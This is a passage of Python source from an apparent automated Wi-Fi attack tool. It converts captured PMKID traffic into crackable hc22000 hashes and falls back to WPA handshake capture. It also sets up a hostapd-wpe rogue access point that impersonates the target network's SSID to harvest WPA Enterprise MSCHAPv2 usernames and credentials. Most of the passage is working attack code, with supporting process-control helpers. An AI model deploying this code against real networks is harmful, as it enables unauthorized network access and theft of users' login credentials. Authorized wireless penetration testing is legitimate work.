        if not os.path.exists(pcap_out) or os.path.getsize(pcap_out) == 0:
            self._call(self.on_log, "PMKID",
                "Targeted PMKID: no pcapng captured — falling back to handshake")
            self._attack_handshake()
            return False

        conv_cmd = [hcxpcap, "-o", hash_out, pcap_out]
        self._call(self.on_log, "PMKID", "Converting pcapng → hc22000…")
        self._run_sync(conv_cmd, timeout=30)

        if not os.path.exists(hash_out) or os.path.getsize(hash_out) == 0:
            self._call(self.on_log, "PMKID",
                "Targeted PMKID: conversion empty — falling back to handshake")
            self._attack_handshake()
            return False

        self._call(self.on_log, "PMKID", f"Targeted PMKID hash ready: {hash_out}")
        self._call(self.on_progress, 55)
        self._call(self.on_pmkid, hash_out)
        self._call(self.on_capture, hash_out, "pmkid")
        self._call(self.on_finished, True)
        return True

    # ── WPA Enterprise attack ─────────────────────────────────────────────────

    def _attack_enterprise(self):
        """
        WPA Enterprise (MGT/EAP) handler using hostapd-wpe rogue AP.
        Captures RADIUS handshake (MSCHAPV2/PEAP credentials).
        Falls back gracefully if hostapd-wpe is unavailable.
        """
        self._call(self.on_phase, "WPA Enterprise Attack")
        self._call(self.on_log, "ENTERPRISE", "WPA Enterprise target detected")

        if not shutil.which("hostapd-wpe"):
            self._call(self.on_log, "ENTERPRISE",
                "hostapd-wpe not found — WPA Enterprise capture skipped")
            self._call(self.on_finished, False)
            return

        self._call(self.on_log, "ENTERPRISE",
            "hostapd-wpe available — setting up rogue AP to capture RADIUS handshake…")
        self._call(self.on_progress, 10)

        conf_path = os.path.join(self._tmpdir, "hostapd-wpe.conf")
        radius_log = os.path.join(self._tmpdir, "radius_handshake.log")

        conf_content = (
            f"interface={self._iface}\n"
            f"ssid={self._ssid}\n"
            f"channel={self._channel}\n"
            "hw_mode=g\n"
            "auth_algs=1\n"
            "wpa=3\n"
            "wpa_key_mgmt=WPA-EAP\n"
            "ieee8021x=1\n"
            "eap_server=1\n"
            "eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user\n"
            "ca_cert=/etc/hostapd-wpe/certs/ca.pem\n"
            "server_cert=/etc/hostapd-wpe/certs/server.pem\n"
            "private_key=/etc/hostapd-wpe/certs/server.key\n"
            "private_key_passwd=\n"
        )
        try:
            with open(conf_path, "w") as fh:
                fh.write(conf_content)
        except Exception as exc:
            self._call(self.on_log, "ERROR", f"Failed to write hostapd-wpe config: {exc}")
            self._call(self.on_finished, False)
            return

        cmd = ["hostapd-wpe", conf_path]
        self._call(self.on_log, "ENTERPRISE",
            f"Launching hostapd-wpe rogue AP on {self._iface} (SSID: {self._ssid})…")
        proc = self._popen(cmd)
        if not proc:
            self._call(self.on_log, "ERROR", "hostapd-wpe failed to start")
            self._call(self.on_finished, False)
            return

        # Run for up to 5 minutes waiting for a client to authenticate
        deadline = time.time() + min(300, self._timeout)
        handshake_captured = False

        while time.time() < deadline and not self.is_stopped():
            self._interruptible_sleep(10)
            elapsed = time.time() - (deadline - min(300, self._timeout))
            pct = min(90, 10 + int(elapsed / min(300, self._timeout) * 80))
            self._call(self.on_progress, pct)

            # Check hostapd-wpe log for captured credentials
            wpe_log = os.path.join(self._tmpdir, "hostapd-wpe.log")
            if not os.path.exists(wpe_log):
                wpe_log = "/var/log/hostapd-wpe.log"
            if os.path.exists(wpe_log):
                try:
                    with open(wpe_log, "r", errors="replace") as fh:
                        content = fh.read()
                    if "mschapv2" in content.lower() or "username" in content.lower():
                        import shutil as _sh
                        _sh.copy2(wpe_log, radius_log)
                        self._call(self.on_log, "ENTERPRISE",
                            f"RADIUS handshake captured → {radius_log}")
                        handshake_captured = True
                        break
                except Exception:
                    pass

            if proc.poll() is not None:
                break

        self._kill_proc(proc)

        if handshake_captured:
            self._call(self.on_handshake, radius_log)
            self._call(self.on_capture, radius_log, "enterprise_radius")
            self._call(self.on_progress, 100)
            self._call(self.on_finished, True)
        else:
            if not self.is_stopped():
                self._call(self.on_log, "ENTERPRISE",
                    "No Enterprise credentials captured within timeout")
                self._call(self.on_finished, False)

    # ── Process management helpers ─────────────────────────────────────────────

    def _popen(self, cmd: list, capture: bool = False) -> subprocess.Popen | None:
        """Launch a subprocess, register it for cleanup, return handle.

        capture=True pipes stdout/stderr (for WPS where we read output).
        capture=False (default) uses DEVNULL — prevents pipe-buffer deadlock
        for long-running tools (airodump-ng, aireplay-ng, hcxdumptool) whose
        output we never read.
        """
        try:
            proc = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE   if capture else subprocess.DEVNULL,
                stderr=subprocess.PIPE   if capture else subprocess.DEVNULL,
                text=capture,
            )
            self._procs.append(proc)
            log.debug("Spawned PID %d: %s", proc.pid, " ".join(cmd))
            return proc
        except FileNotFoundError:
            log.error("Executable not found: %s", cmd[0])
            self._call(self.on_log, "ERROR", f"Tool not found: {cmd[0]}")
            return None
        except Exception as exc:
            log.error("Failed to spawn %s: %s", cmd[0], exc)
            return None

    def _kill_proc(self, proc: subprocess.Popen | None) -> None:
        """Terminate then kill a process."""
        if not proc:
            return
        try:
            if proc.poll() is None:
                proc.terminate()
                try:
                    proc.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    proc.kill()
                    proc.wait(timeout=3)
        except Exception:
            pass
        if proc in self._procs:
            self._procs.remove(proc)

    def _cleanup_procs(self) -> None:
        """Kill all registered child processes."""
        for proc in list(self._procs):
            self._kill_proc(proc)

    def _run_sync(self, cmd: list, timeout: int = 30) -> tuple[int, str, str]:
        """Run a command synchronously and return (rc, stdout, stderr)."""
        try:
            result = subprocess.run(
                cmd, capture_output=True, text=True, timeout=timeout
            )
            return result.returncode, result.stdout, result.stderr
        except subprocess.TimeoutExpired:
            return -1, "", "Timeout"
        except FileNotFoundError:
            return -1, "", f"Not found: {cmd[0]}"
        except Exception as exc:
            return -1, "", str(exc)

    def _interruptible_sleep(self, seconds: float) -> None:
        """Sleep in 0.25s increments, respecting stop flag."""
        end = time.time() + seconds
        while time.time() < end and not self.is_stopped():
            time.sleep(min(0.25, end - time.time()))

    # ── Public control API ────────────────────────────────────────────────────

    # Alias — WPA attacks go through PMKID → handshake pipeline
    def _attack_wpa(self):
        """WPA/WPA2 attack: attempt PMKID capture, fall back to handshake."""
        pmkid_ok = self._attack_pmkid()
        if not pmkid_ok and not self.is_stopped():
            self._attack_handshake()

    def stop(self) -> None:
        """Signal attack to stop and kill all child processes."""
        super().stop()
        self._cleanup_procs()
